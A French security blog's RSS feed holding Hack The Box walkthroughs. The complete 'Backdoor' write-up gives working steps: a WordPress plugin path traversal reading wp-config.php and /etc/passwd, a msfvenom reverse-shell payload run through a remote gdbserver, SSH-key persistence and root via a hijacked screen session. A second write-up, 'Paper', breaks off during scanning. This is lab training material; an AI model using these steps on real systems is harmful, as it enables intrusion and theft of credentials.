<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>HTB - Balise - Masoopy</title><link>https://www.masoopy.com/fr/tags/htb/</link><description>HTB - Balise - Masoopy</description><generator>Hugo -- gohugo.io</generator><language>fr</language><lastBuildDate>Tue, 03 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.masoopy.com/fr/tags/htb/" rel="self" type="application/rss+xml"/><item><title>HTB - Backdoor sans MetaSploit</title><link>https://www.masoopy.com/fr/htb-backdoor-sans-metasploit/</link><pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/fr/htb-backdoor-sans-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2022/03/Backdoor_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>Pour ce premier article en Français, nous allons nous attaquer à Backdoor. Nous avons affaire à un Wordpress à jour mais avec un plugin vulnérable qui par le biais d&rsquo;une <code>LFI</code> et d&rsquo;un serveur distant <code>gdb</code> nous permettra d&rsquo;obtenir les droits &ldquo;root&rdquo;. Allons-y !</p>
<h2 id="cible">Cible</h2>
<p><a href="https://app.hackthebox.com/machines/Backdoor" target="_blank" rel="noopener noreferrer">HTB - Backdoor</a></p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>Petite reconnaissance basique en fonction des logos et autres infos :</p>
<ul>
<li>Il s&rsquo;agit d&rsquo;un système Linux ;</li>
<li>&hellip;</li>
</ul>
<p>Et c&rsquo;est tout !</p>
<h2 id="énumération">Énumération</h2>
<p>Lançons notre scan <code>nmap</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\Backdoor.htb
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 14:45 CET                                                                                                                                                   
Nmap scan report for Backdoor.htb.214                                                                                                                                                                               
Host is up (0.043s latency).                                                                                                                                                                                      
Not shown: 998 closed tcp ports (reset)                                                                                                                                                                           
PORT   STATE SERVICE VERSION                                                                                                                                                                                      
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                                 
| ssh-hostkey:                                                                                                                                                                                                    
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)                                                                                                                                                    
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)                                                                                                                                                   
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)                                                                                                                                                 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                                               
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                                      
|_http-generator: WordPress 5.8.1                                                                                                                                                                                 
|_http-title: Backdoor &amp;#8211; Real-Life                                                                                                                                                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                           
                                                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds 
</code></pre></td></tr></table>
</div>
</div><p>Nous pouvons voir les services classiques pour une box Linux : SSH et un serveur web sur le port 80 qui fait tourner Wordpress.</p>
<p>Sachant qu&rsquo;il s&rsquo;agit d&rsquo;un serveur web, j&rsquo;aime bien lancer <code>Gobuster</code> pour essayer de trouver des chemins cachés :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://Backdoor.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o scans/gobuster
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://Backdoor.htb.214
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/15 14:46:36 Starting gobuster in directory enumeration mode
===============================================================
/wp-admin             (Status: 301) [Size: 319] [--&gt; http://Backdoor.htb/wp-admin/]
/wp-includes          (Status: 301) [Size: 322] [--&gt; http://Backdoor.htb/wp-includes/]
/wp-content           (Status: 301) [Size: 321] [--&gt; http://Backdoor.htb/wp-content/] 
/server-status        (Status: 403) [Size: 279]                                         
Progress: 23947 / 62284 (38.45%)                                                       [ERROR] 2022/03/15 14:47:05 [!] parse &#34;http://Backdoor.htb/error\x1f_log&#34;: net/url: invalid control character in URL
                                                                                        
===============================================================
2022/03/15 14:47:48 Finished
===============================================================
</code></pre></td></tr></table>
</div>
</div><p>Ce scan ne nous révèle pas grand chose&hellip; Mais puisqu&rsquo;il s&rsquo;agit d&rsquo;un Wordpress, nous allons lancer <code>wpscan</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">wpscan --url http://Backdoor.htb
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">______________________________________________________________           
        __          _______   _____          
        \ \        / /  __ \ / ____|                                                                    
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                            
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|               
                                                   
        WordPress Security Scanner by the WPScan Team                       
                        Version 3.8.17                                                                  
      Sponsored by Automattic - https://automattic.com/                                    
      @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
                                                                                                                                                                                                                 
[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.                                                                                    
                                                   
[+] URL: http://Backdoor.htb.214/ [Backdoor.htb.214]
[+] Started: Tue Mar 15 14:46:02 2022 
                                                                                                                                                                                                                 
Interesting Finding(s):
                                                   
[+] Headers
| Interesting Entry: Server: Apache/2.4.41 (Ubuntu) 
| Found By: Headers (Passive Detection)
| Confidence: 100%                                                                                      
                                                                                                                                                                                                                 
[+] XML-RPC seems to be enabled: http://Backdoor.htb.214/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:                                                                                           
|  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
                                                   
[+] WordPress readme found: http://Backdoor.htb.214/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%       

[+] Upload directory has listing enabled: http://Backdoor.htb.214/wp-content/uploads/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://Backdoor.htb.214/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
|  - https://www.iplocation.net/defend-wordpress-from-ddos
|  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
| Found By: Rss Generator (Passive Detection)
|  - http://Backdoor.htb.214/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
|  - http://Backdoor.htb.214/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
| Location: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/
| Last Updated: 2022-01-25T00:00:00.000Z
| Readme: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/readme.txt
| [!] The version is out of date, the latest version is 2.9
| Style URL: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/style.css?ver=20201208
| Style Name: Twenty Seventeen
| Style URI: https://wordpress.org/themes/twentyseventeen/
| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Css Style In Homepage (Passive Detection)
|
| Version: 2.8 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://Backdoor.htb.214/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#39;Version: 2.8&#39;

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:00 &lt;===================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar 15 14:46:06 2022
[+] Requests Done: 181
[+] Cached Requests: 5
[+] Data Sent: 45.04 KB
[+] Data Received: 18.321 MB
[+] Memory used: 234.484 MB
[+] Elapsed time: 00:00:04
</code></pre></td></tr></table>
</div>
</div><p>Pas grand chose à se mettre sous la dent&hellip; mais pendant que mes scans tournent en arrière plan, j&rsquo;aime bien surfer manuellement sur le site &ldquo;cible&rdquo;. Dans notre cas, j&rsquo;ai vu que le &ldquo;directory listing&rdquo; était activé, et j&rsquo;ai donc découvert un plugin intéressant.</p>
<p>Pour info, nous aurions aussi pu lancer un <code>wpscan</code> agrressif pour découvrir ce même plugin :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">wpscan --url http://backdoor.htb --plugins-detection aggressive
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">[+] Enumerating All Plugins (via Aggressive Methods)                                                                                                                                                       [0/822]
 Checking Known Locations - Time: 00:07:56 &lt;==============================================================================================================================&gt; (97256 / 97256) 100.00% Time: 00:07:56
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
</code></pre></td></tr></table>
</div>
</div><p>Nous voyons donc ce plugin: <code>ebook-download</code> qui est <a href="https://www.exploit-db.com/exploits/39575" target="_blank" rel="noopener noreferrer">vulnérable</a>. Nous pouvons par exemple récupérer le fichier <code>wp-config.php</code> via cette URL : <code>http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</code>.</p>
<p>Malheureusement, cela ne nous aide pas&hellip; le mot de passe utilisé par le compte <code>MySQL</code> n&rsquo;est pas le même que celui de <code>root</code>, ni même de l&rsquo;utilisateur qui s&rsquo;appelle d&rsquo;ailleurs <code>user</code> (d&rsquo;après le fichier <code>/etc/passwd</code> que nous pouvons aussi récupérer via cette LFI).</p>
<h2 id="exploitation">Exploitation</h2>
<p>Cependant, Linux maintient une liste de processus dans <code>/proc</code> et cela est accessible par n&rsquo;importe qui. Après avoir vérifié que cela fonctionne avec <code>Burp</code>,  nous pouvons écrire un petit bout de script pour automatiser la chose :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">for i in $(seq 0 2000); do echo -n &#34;$i: &#34;; curl &#34;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=//proc/$i/cmdline&#34; --output -; echo; done | tee pid.lst
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>NB : a noter que le &ldquo;//&rdquo;, est une sorte d&rsquo;abréviation pour remplacer les moultes &ldquo;../../&rdquo; qui permettent de remonter du <code>webdir</code> jusqu&rsquo;à la racine du système.</p>
<p>Ce script est très sommaire et mériterait quelques coups de <code>sed</code> / <code>awk</code> pour nettoyer l'<code>output</code>, cependant, il nous révèle la présence d&rsquo;un serveur <code>gdb</code> sur le port 1337 que nous avions raté lors de notre scan <code>nmap</code> initial.</p>
<h3 id="obtenir-un-premier-shell">Obtenir un premier shell</h3>
<p>Après quelques secondes de lectures sur <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver" target="_blank" rel="noopener noreferrer">la bible du PenTest</a>, nous trouvons une méthode pour exploiter un serveur distant <code>gdb</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback"># Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
</code></pre></td></tr></table>
</div>
</div><p>En effet, nous obtenons bien un shell ! Obtenir le <code>flag user</code> est donc un jeu d&rsquo;enfant, via la commande <code>cat</code> :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>Avant de travailler sur le PrivEsc, j&rsquo;aime bien sécuriser mon accès en y déposant ma clef ssh. Pour rappel, on la génère avec :</p>
<p><code>ssh-keygen -f backdoor</code></p>
<p>NB : pas de &ldquo;mot de passe&rdquo;, je génère une nouvelle clef pour chaque box, que je nomme du nom de la box.</p>
<p>Ensuite, nous l&rsquo;inscrivons dans le fichier <code>authorized_keys</code> de l&rsquo;utilisateur que nous venons de pwn.</p>
<p><code>echo xxxxxxxx &gt; ~/.ssh/authorized_keys</code></p>
<p>avec &ldquo;xxxxxxxx&rdquo;, étant le contenu de votre fichier backdoor.pub.</p>
<p>Enfin, n&rsquo;oubliez pas de changer les droits, sur le serveur distant :</p>
<p><code>chmod 600 ~/.ssh/authorized_keys</code></p>
<p>et sur votre clef juste créée :</p>
<p><code>chmod 600 backdoor</code></p>
<p>Nous pouvons nous reconnecter en SSH avec un shell digne de ce nom.</p>
<p>Peut-être l&rsquo;aviez-vous remarqué avant, mais nous avons aperçu qu&rsquo;une session du logiciel <code>screen</code> tournait sur le serveur. C&rsquo;est toujours intéressant, et cela mérite d&rsquo;y regarder de plus près via la liste des process :</p>
<p><code>ps faux</code></p>
<p></p>
<p>Effectivement, <code>screen</code> tourne en tant que <code>root</code> avec les arguments <code>dmS root</code>. Après une inspection du <code>man</code>, cela veut dire que <code>screen</code> a été lancé en mode détaché avec le nom de session <code>root</code>.</p>
<p>Pour récupérer la session, il suffit de taper :</p>
<p><code>screen -dr root/992.root</code></p>
<p>Et bingo, nous sommes <code>root</code> et pouvons récupérer le <code>flag root</code> :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>Une nouvelle box plutôt fun, qui m&rsquo;a permis de jouer avec le contenu de <code>/proc</code> afin de retrouver les processus actifs du serveur. Mais aussi une box, qui m&rsquo;a rappelé que les scans <code>nmap</code> rapides, c&rsquo;est bien joli, mais ça ne voit pas tout.</p>
<p>A l&rsquo;avenir, il pourrait aussi être opportun de lancer un <code>nmap -p-</code> en arrière-plan, histoire de&hellip;</p>
]]></description></item><item><title>HTB - Paper sans MetaSploit</title><link>https://www.masoopy.com/fr/htb-paper-sans-metasploit/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/fr/htb-paper-sans-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2022/03/Paper_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>Aujourd&rsquo;hui, nous allons nous attaquer à Paper, une box plutôt simple et aussi très fun. Si vous débutez dans le domaine, je vous recommande très fortement d&rsquo;essayer de vous creuser la tête avant de lire ce guide. Cette box est vraiment fun, et très sympa pour les débutants !</p>
<h2 id="cible">Cible</h2>
<p><a href="https://app.hackthebox.com/machines/Paper" target="_blank" rel="noopener noreferrer">HTB - Paper</a></p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>Petite reconnaissance basique en fonction des logos et autres infos :</p>
<ul>
<li>Il s&rsquo;agit d&rsquo;un système Linux ;</li>
<li>&hellip;</li>
</ul>
<p>Et c&rsquo;est tout !</p>
<h2 id="énumération">Énumération</h2>
<p>Lançons notre scan <code>nmap</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\$IP_CIBLE
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 15:39 CET
Nmap scan report for $IP_CIBLE
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
</code></pre></td></tr></table>
</div>
</div><p>Nous pouvons voir les services classiques pour une box Linux : SSH et un serveur Apache qui tourne sur les ports 80/tcp et 443/tcp (pour le HTTPs).</p>
<p>Sachant qu&rsquo;il s&rsquo;agit d&rsquo;un serveur web, j&rsquo;aime bien lancer <code>Gobuster</code> pour essayer de trouver des chemins cachés :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$IP_CIBLE -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o scans/gobuster
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://$IP_CIBLE
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/02 15:42:41 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/manual               (Status: 301) [Size: 236] [--&gt; http://$IP_CIBLE/manual/]
                                                                                  
===============================================================
2022/03/02 15:42:52 Finished
===============================================================
</code></pre></td></tr></table>
</div>
</div><p>Ce scan ne nous révèle pas grand chose&hellip; Nous allons donc lancer <code>Nikto</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">nikto -h http://$IP_CIBLE
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">- Nikto v2.1.6
